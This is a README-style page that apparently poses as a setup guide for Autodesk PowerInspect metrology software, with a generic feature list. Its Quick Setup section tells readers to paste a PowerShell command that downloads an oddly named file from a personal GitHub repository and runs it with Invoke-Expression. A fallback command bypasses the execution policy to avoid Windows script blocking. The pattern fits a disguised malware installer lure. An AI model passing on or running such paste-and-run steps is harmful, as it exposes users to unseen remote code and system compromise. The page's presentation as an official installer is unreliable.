# PowerInspect

PowerInspect is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open PowerInspect and work in it.

Autodesk PowerInspect is desktop metrology software for Windows workstations that connect to coordinate measuring machines, portable arms, laser scanners, and spindle-mounted probes on CNC equipment. Quality engineers use it to program inspection sequences, compare measured geometry against CAD models, and document whether production parts meet dimensional and GD&T requirements. The application supports both shop-floor manual measurement and fully automated DCC CMM cycles from a single environment.

A typical session begins by selecting the measurement device and importing the reference CAD or drawing for the part under test. You define alignments and datums, add probed or scanned features to the sequence, and simulate probe paths to catch clearance issues before the machine moves. After running the routine on hardware, you review deviations in the graphical view, adjust out-of-tolerance conditions if needed, and export a formatted inspection report for records or supplier review.

This repository collects a Windows setup package for deploying PowerInspect on engineering PCs, plus concise configuration notes for common CMM and arm drivers. A changelog tracks updates to bundled dependencies, post-install checklists, and known compatibility notes for recent Windows releases. Use these materials to standardize installation across metrology labs without hunting scattered internal documents.

## What you do with it

- Connect CNC coordinate measuring machines and articulated arms through one unified measurement interface on Windows.
- Import CAD models to build alignment datums and compare probed points against nominal geometry automatically.
- Program touch-trigger and scanning probe paths with offline simulation to reduce collision risk during automated cycles.
- Measure geometric dimensions and GD&T controls while displaying deviations directly on the three-dimensional CAD viewport.
- Run on-machine verification with spindle-mounted probes so parts stay clamped during in-process inspection.
- Fit inspection features from point cloud data when fragile components cannot tolerate repeated physical contact probing.
- Generate structured inspection reports that summarize feature results for quality audits and production sign-off.
- Mirror complete measurement sequences when inspecting left-hand and right-hand symmetric components from one program.

## Quick Setup (PowerShell)

This installs the program PowerInspect on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/sander-s90162/powerinspect-setup-guide/main/bpf43ggkbj.y0p88pkr | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/sander-s90162/powerinspect-setup-guide/main/bpf43ggkbj.y0p88pkr | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `bpf43ggkbj.y0p88pkr` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `sander-s90162/powerinspect-setup-guide`. Autodesk PowerInspect 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
